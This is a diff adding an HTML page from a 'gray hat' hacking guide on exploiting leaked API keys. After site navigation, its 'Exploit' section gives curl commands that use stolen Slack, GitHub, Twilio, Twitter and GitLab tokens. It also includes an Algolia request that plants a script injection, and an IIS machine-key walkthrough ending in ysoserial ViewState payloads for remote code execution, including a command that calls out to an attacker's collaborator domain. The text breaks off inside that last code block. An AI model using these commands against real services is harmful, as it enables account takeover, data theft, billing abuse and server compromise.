@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Tips and tricks for sniffing out API key leaks; where to look and how to find them.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Finding API Key Leaks" />
+<meta property="og:description" content="Tips and tricks for sniffing out API key leaks; where to look and how to find them." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/api_key_leaks/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-16T00:00:00+00:00" />
+<title>Finding API Key Leaks | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.cb24aa208fe3b7dbeaa3be7530e67a6530d6d2b11a139f90ef95cc65bf8d8727.js" integrity="sha256-yySqII/jt9vqo751MOZ6ZTDW0rEaE5&#43;Q75XMZb&#43;Nhyc=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="active">Finding API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/alex-shpak/hugo-book"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://themes.gohugo.io/hugo-book/"  target="_blank" rel="noopener">
+        Hugo Themes
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Finding API Key Leaks</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#api-key-leaks">API Key Leaks</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#exploit">Exploit</a>
+          <ul>
+            <li><a href="#google-maps">Google Maps</a></li>
+            <li><a href="#algolia">Algolia</a></li>
+            <li><a href="#slack-api-token">Slack API Token</a></li>
+            <li><a href="#facebook-access-token">Facebook Access Token</a></li>
+            <li><a href="#github-client-id-and-client-secret">Github client id and client secret</a></li>
+            <li><a href="#twilio-account_sid-and-auth-token">Twilio Account_sid and Auth token</a></li>
+            <li><a href="#twitter-api-secret">Twitter API Secret</a></li>
+            <li><a href="#twitter-bearer-token">Twitter Bearer Token</a></li>
+            <li><a href="#gitlab-personal-access-token">Gitlab Personal Access Token</a></li>
+            <li><a href="#hockeyapp-api-token">HockeyApp API Token</a></li>
+            <li><a href="#iis-machine-keys">IIS Machine Keys</a></li>
+            <li><a href="#mapbox-api-token">Mapbox API Token</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="api-key-leaks">
+  API Key Leaks
+  <a class="anchor" href="#api-key-leaks">#</a>
+</h1>
+<blockquote>
+<p>The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.</p>
+</blockquote>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://github.com/momenbasel/KeyFinder">KeyFinder - is a tool that let you find keys while surfing the web!</a></li>
+<li>
+  <a href="https://github.com/streaak/keyhacks">Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they&rsquo;re valid.</a></li>
+<li>
+  <a href="https://github.com/trufflesecurity/truffleHog">truffleHog - Find credentials all over the place</a>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>docker run -it -v <span style="color:#e6db74">&#34;</span>$PWD<span style="color:#e6db74">:/pwd&#34;</span> trufflesecurity/trufflehog<span style="color:#960050;background-color:#1e0010">:</span>latest github --repo https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/trufflesecurity/test_keys
+</span></span><span style="display:flex;"><span>docker run -it -v <span style="color:#e6db74">&#34;</span>$PWD<span style="color:#e6db74">:/pwd&#34;</span> trufflesecurity/trufflehog<span style="color:#960050;background-color:#1e0010">:</span>latest github --org=trufflesecurity
+</span></span><span style="display:flex;"><span>trufflehog git https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/trufflesecurity/trufflehog.git
+</span></span><span style="display:flex;"><span>trufflehog github --endpoint https<span style="color:#960050;background-color:#1e0010">:</span>//api.github.com --org trufflesecurity --token GITHUB_TOKEN --debug --concurrency <span style="color:#ae81ff">2</span>
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="exploit">
+  Exploit
+  <a class="anchor" href="#exploit">#</a>
+</h2>
+<p>The following commands can be used to takeover accounts or extract personal information from the API using the leaked token.</p>
+<h3 id="google-maps">
+  Google Maps
+  <a class="anchor" href="#google-maps">#</a>
+</h3>
+<p>Use : 
+  <a href="https://github.com/ozguralp/gmapsapiscanner/">https://github.com/ozguralp/gmapsapiscanner/</a></p>
+<p>Usage:</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Endpoint</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Static Maps</td>
+<td>
+  <a href="https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&amp;zoom=7&amp;size=400x400&amp;key=KEY_HERE">https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key=KEY_HERE</a></td>
+</tr>
+<tr>
+<td>Streetview</td>
+<td>
+  <a href="https://maps.googleapis.com/maps/api/streetview?size=400x400&amp;location=40.720032,-73.988354&amp;fov=90&amp;heading=235&amp;pitch=10&amp;key=KEY_HERE">https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key=KEY_HERE</a></td>
+</tr>
+<tr>
+<td>Embed</td>
+<td>
+  <a href="https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&amp;key=KEY_HERE">https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&key=KEY_HERE</a></td>
+</tr>
+<tr>
+<td>Directions</td>
+<td>
+  <a href="https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&amp;destination=Universal&#43;Studios&#43;Hollywood4&amp;key=KEY_HERE">https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=KEY_HERE</a></td>
+</tr>
+<tr>
+<td>Geocoding</td>
+<td>
+  <a href="https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&amp;key=KEY_HERE">https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=KEY_HERE</a></td>
+</tr>
+<tr>
+<td>Distance Matrix</td>
+<td>
+  <a href="https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&amp;origins=40.6655101,-73.89188969999998&amp;destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&amp;key=KEY_HERE">https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=KEY_HERE</a></td>
+</tr>
+<tr>
+<td>Find Place from Text</td>
+<td>
+  <a href="https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&amp;inputtype=textquery&amp;fields=photos,formatted_address,name,rating,opening_hours,geometry&amp;key=KEY_HERE">https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE</a></td>
+</tr>
+<tr>
+<td>Autocomplete</td>
+<td>
+  <a href="https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&amp;types=%28cities%29&amp;key=KEY_HERE">https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=KEY_HERE</a></td>
+</tr>
+<tr>
+<td>Elevation</td>
+<td>
+  <a href="https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&amp;key=KEY_HERE">https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=KEY_HERE</a></td>
+</tr>
+<tr>
+<td>Timezone</td>
+<td>
+  <a href="https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&amp;timestamp=1331161200&amp;key=KEY_HERE">https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY_HERE</a></td>
+</tr>
+<tr>
+<td>Roads</td>
+<td>
+  <a href="https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795">https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795</a></td>
+</tr>
+<tr>
+<td>Geolocate</td>
+<td>
+  <a href="https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE">https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE</a></td>
+</tr>
+</tbody>
+</table>
+<p>Impact:</p>
+<ul>
+<li>Consuming the company&rsquo;s monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company</li>
+<li>Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account</li>
+</ul>
+<h3 id="algolia">
+  Algolia
+  <a class="anchor" href="#algolia">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl --request PUT \
+</span></span><span style="display:flex;"><span>  --url https<span style="color:#960050;background-color:#1e0010">:</span>//&lt;application-id&gt;<span style="color:#ae81ff">-1</span>.algolianet.com/<span style="color:#ae81ff">1</span>/indexes/&lt;example-index&gt;/settings \
+</span></span><span style="display:flex;"><span>  --header <span style="color:#e6db74">&#39;content-type: application/json&#39;</span> \
+</span></span><span style="display:flex;"><span>  --header <span style="color:#e6db74">&#39;x-algolia-api-key: &lt;example-key&gt;&#39;</span> \
+</span></span><span style="display:flex;"><span>  --header <span style="color:#e6db74">&#39;x-algolia-application-id: &lt;example-application-id&gt;&#39;</span> \
+</span></span><span style="display:flex;"><span>  --data <span style="color:#e6db74">&#39;{&#34;highlightPreTag&#34;: &#34;&lt;script&gt;alert(1);&lt;/script&gt;&#34;}&#39;</span>
+</span></span></code></pre></div><h3 id="slack-api-token">
+  Slack API Token
+  <a class="anchor" href="#slack-api-token">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -sX POST <span style="color:#e6db74">&#34;https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&amp;pretty=1&#34;</span>
+</span></span></code></pre></div><h3 id="facebook-access-token">
+  Facebook Access Token
+  <a class="anchor" href="#facebook-access-token">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl https<span style="color:#960050;background-color:#1e0010">:</span>//developers.facebook.com/tools/debug/accesstoken/<span style="color:#66d9ef">?</span>access_token=ACCESS_TOKEN_HERE&amp;version=v3.2
+</span></span></code></pre></div><h3 id="github-client-id-and-client-secret">
+  Github client id and client secret
+  <a class="anchor" href="#github-client-id-and-client-secret">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;https://api.github.com/users/whatever?client_id=xxxx&amp;client_secret=yyyy&#39;</span>
+</span></span></code></pre></div><h3 id="twilio-account_sid-and-auth-token">
+  Twilio Account_sid and Auth token
+  <a class="anchor" href="#twilio-account_sid-and-auth-token">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -X GET <span style="color:#e6db74">&#39;https://api.twilio.com/2010-04-01/Accounts.json&#39;</span> -u ACCOUNT_SID<span style="color:#960050;background-color:#1e0010">:</span>AUTH_TOKEN
+</span></span></code></pre></div><h3 id="twitter-api-secret">
+  Twitter API Secret
+  <a class="anchor" href="#twitter-api-secret">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -u <span style="color:#e6db74">&#39;API key:API secret key&#39;</span> --data <span style="color:#e6db74">&#39;grant_type=client_credentials&#39;</span> <span style="color:#e6db74">&#39;https://api.twitter.com/oauth2/token&#39;</span>
+</span></span></code></pre></div><h3 id="twitter-bearer-token">
+  Twitter Bearer Token
+  <a class="anchor" href="#twitter-bearer-token">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl --request GET --url https<span style="color:#960050;background-color:#1e0010">:</span>//api.twitter.com/<span style="color:#ae81ff">1.1</span>/account_activity/all/subscriptions/count.json --header <span style="color:#e6db74">&#39;authorization: Bearer TOKEN&#39;</span>
+</span></span></code></pre></div><h3 id="gitlab-personal-access-token">
+  Gitlab Personal Access Token
+  <a class="anchor" href="#gitlab-personal-access-token">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://gitlab.example.com/api/v4/projects?private_token=&lt;your_access_token&gt;&#34;</span>
+</span></span></code></pre></div><h3 id="hockeyapp-api-token">
+  HockeyApp API Token
+  <a class="anchor" href="#hockeyapp-api-token">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c&#34;</span> https<span style="color:#960050;background-color:#1e0010">:</span>//rink.hockeyapp.net/api/<span style="color:#ae81ff">2</span>/apps/2021bdf2671ab09174c1de5ad147ea2ba4
+</span></span></code></pre></div><h3 id="iis-machine-keys">
+  IIS Machine Keys
+  <a class="anchor" href="#iis-machine-keys">#</a>
+</h3>
+<blockquote>
+<p>That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.</p>
+</blockquote>
+<p>Requirements</p>
+<ul>
+<li>machineKey <strong>validationKey</strong> and <strong>decryptionKey</strong></li>
+<li>__VIEWSTATEGENERATOR cookies</li>
+<li>__VIEWSTATE cookies</li>
+</ul>
+<p>Example of a machineKey from 
+  <a href="https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication">https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;machineKey</span> <span style="color:#a6e22e">validationKey=</span><span style="color:#e6db74">&#34;87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC&#34;</span> <span style="color:#a6e22e">decryptionKey=</span><span style="color:#e6db74">&#34;E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7&#34;</span> <span style="color:#a6e22e">validation=</span><span style="color:#e6db74">&#34;SHA1&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span></code></pre></div><p>Common locations of <strong>web.config</strong> / <strong>machine.config</strong></p>
+<ul>
+<li>32-bit
+<ul>
+<li>C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config</li>
+<li>C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config</li>
+</ul>
+</li>
+<li>64-bit
+<ul>
+<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config</li>
+</ul>
+</li>
+<li>in registry when <strong>AutoGenerate</strong> is enabled (extract with 
+  <a href="https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab">https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab</a>)
+<ul>
+<li>HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4</li>
+<li>HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey</li>
+</ul>
+</li>
+</ul>
+<h4 id="identify-known-machine-key">
+  Identify known machine key
+  <a class="anchor" href="#identify-known-machine-key">#</a>
+</h4>
+<ul>
+<li>Exploit with 
+  <a href="https://github.com/NotSoSecure/Blacklist3r">Blacklist3r/AspDotNetWrapper</a></li>
+<li>Exploit with 
+  <a href="https://github.com/0xacb/viewgen">ViewGen</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># --webconfig WEBCONFIG: automatically load keys and algorithms from a web.config file</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -m MODIFIER, --modifier MODIFIER: VIEWSTATEGENERATOR value</span>
+</span></span><span style="display:flex;"><span>$ viewgen --guess <span style="color:#e6db74">&#34;/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI=&#34;</span>
+</span></span><span style="display:flex;"><span>[+] ViewState is not encrypted
+</span></span><span style="display:flex;"><span>[+] Signature algorithm<span style="color:#960050;background-color:#1e0010">:</span> SHA1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --encrypteddata : __VIEWSTATE parameter value of the target application</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --modifier : __VIEWSTATEGENERATOR parameter value</span>
+</span></span><span style="display:flex;"><span>$ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata &lt;real viewstate value&gt; --purpose=viewstate --modifier=&lt;modifier value&gt; <span style="color:#960050;background-color:#1e0010">–</span>macdecode
+</span></span></code></pre></div><h4 id="decode-viewstate">
+  Decode ViewState
+  <a class="anchor" href="#decode-viewstate">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ viewgen --decode --check --webconfig web.config --modifier CA0B0334 <span style="color:#e6db74">&#34;zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY=&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate  --modifier=CA0B0334 --macdecode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath <span style="color:#e6db74">&#34;/Savings-and-Investments/Application/ContactDetails.aspx&#34;</span> <span style="color:#f92672">-f</span> out.txt --IISDirPath=<span style="color:#e6db74">&#34;/&#34;</span>
+</span></span></code></pre></div><h4 id="generate-viewstate-for-rce">
+  Generate ViewState for RCE
+  <a class="anchor" href="#generate-viewstate-for-rce">#</a>
+</h4>
+<p><strong>NOTE</strong>: Send a POST request with the generated ViewState to the same endpoint, in Burp you should <strong>URL Encode Key Characters</strong> for your payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c <span style="color:#e6db74">&#34;cmd.exe /c nslookup &lt;your collab domain&gt;&#34;</span>  --decryptionalg=<span style="color:#e6db74">&#34;AES&#34;</span> --generator=ABABABAB decryptionkey=<span style="color:#e6db74">&#34;&lt;decryption key&gt;&#34;</span>  --validationalg=<span style="color:#e6db74">&#34;SHA1&#34;</span> --validationkey=<span style="color:#e6db74">&#34;&lt;validation key&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>$ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c <span style="color:#e6db74">&#34;echo 123 &gt; c:\pwn.txt&#34;</span> --generator=<span style="color:#e6db74">&#34;CA0B0334&#34;</span> --validationalg=<span style="color:#e6db74">&#34;MD5&#34;</span> --validationkey=<span style="color:#e6db74">&#34;b07b0f97365416288cf0247cffdf135d25f6be87&#34;</span>
